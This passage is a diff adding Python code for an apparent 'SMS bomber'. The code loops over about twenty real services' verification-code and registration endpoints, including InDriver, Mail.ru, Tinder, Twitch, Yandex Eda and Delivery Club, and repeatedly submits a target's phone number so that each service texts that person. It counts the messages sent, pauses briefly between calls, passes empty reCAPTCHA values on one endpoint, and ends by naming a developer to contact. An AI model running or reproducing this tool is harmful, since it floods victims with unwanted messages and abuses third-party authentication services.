+        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
+        R = R + 1
+        print('[+] InDriver отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
+        R = R + 1
+        print('[+] Invitro отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
+        R = R + 1
+        print('[+] Pmsm отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
+        R = R + 1
+        print('[+] IVI отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
+        R = R + 1
+        print('[+] Lenta отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
+        R = R + 1
+        print('[+] Mail.ru отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
+        R = R + 1
+        print('[+] MVideo отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
+        R = R + 1
+        print('[+] OK отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
+        R = R + 1
+        print('[+] qlean отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break    
+
+    try:
+
+        requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
+        R = R + 1
+        print('[+] Qlean отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] не отправлено!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
+        R = R + 1
+        print('[+] SMSgorod отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
+        R = R + 1
+        print('[+] Tinder отправлено! || Кол-во - '+ str(R))  
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
+        R = R + 1
+        print('[+] Twitch отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
+        R = R + 1
+        print('[+] CabWiFi отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
+        R = R + 1
+        print('[+] wowworks отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
+        R = R + 1
+        print('[+] Eda.Yandex отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
+        R = R + 1
+        print('[+] Youla отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
+        R = R + 1
+        print('[+] Alpari отправлено! || Кол-во - '+ str(R))
+        
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
+        R = R + 1
+        print('[+] SMS отправлено! || Кол-во - '+ str(R))
+
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
+
+    if time.time() > start_time + float(CLOSE_AFTER): break
+
+    try:
+
+        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
+        R = R + 1
+        print('[+] Delivery отправлено! || Кол-во - '+ str(R))
+        print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
+        time.sleep(0.1)
+
+    except:
+
+        print('[-] error in sent!')
